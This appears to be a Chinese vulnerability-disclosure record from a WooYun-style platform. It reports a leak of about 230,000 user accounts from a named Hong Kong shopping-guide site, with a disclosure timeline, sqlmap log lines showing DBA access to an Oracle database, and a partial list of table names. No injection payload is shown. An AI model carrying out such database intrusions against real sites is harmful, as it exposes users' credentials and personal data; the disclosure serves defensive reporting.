wybug_title: 国内最受欢迎的香港购物攻略网站23w用户信息泄露
wybug_detail:
漏洞详情 披露状态：   									2015-05-24：	细节已通知厂商并且等待厂商处理中									2015-05-27：	厂商已经确认，细节仅向厂商公开									2015-06-06：	细节向核心白帽子及相关领域专家公开									2015-06-16：	细节向普通白帽子公开									2015-06-26：	细节向实习白帽子公开									2015-07-11：	细节向公众公开  简要描述： 用户信息泄露账号密码一览无余，危害你懂得... 详细说明：  
[13:53:11] [INFO] the back-end DBMS is Oracleweb application technology: Nginxback-end DBMS: Oracle[13:53:11] [INFO] testing if current user is DBAcurrent user is DBA:    True[13:53:11] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.uhuibao.com'
   漏洞证明：  
Database: UHUIBAO[224 tables]+--------------------------------+| BAK_SIGN_UP                    || BAK_TB_GETCARD_INFO            || BAK_TB_GOODS_INFO_20121019     || BAK_TB_GOODS_INFO_PART         || BAK_TB_SHARE_INFO_20121019     || BAK_TB_SHARE_INFO_20130510     || BAK_TB_SHOP_DISCOUNT_1017      || BAK_TB_USER_INFO_20130510      || DR$QW_GOODS_INFO_INDEX$I       || DR$QW_GOODS_INFO_INDEX$K       || DR$QW_GOODS_INFO_INDEX$N       || DR$QW_GOODS_INFO_INDEX$R       || DR$QW_SHOP_DISCOUNT_INDEX$I    || DR$QW_SHOP_DISCOUNT_INDEX$K    || DR$QW_SHOP_DISCOUNT_INDEX$N    || DR$QW_SHOP_DISCOUNT_INDEX$R    || DR$QW_SHOP_INFO_INDEX$I        || DR$QW_SHOP_INFO_INDEX$K        | 此处省略N张表
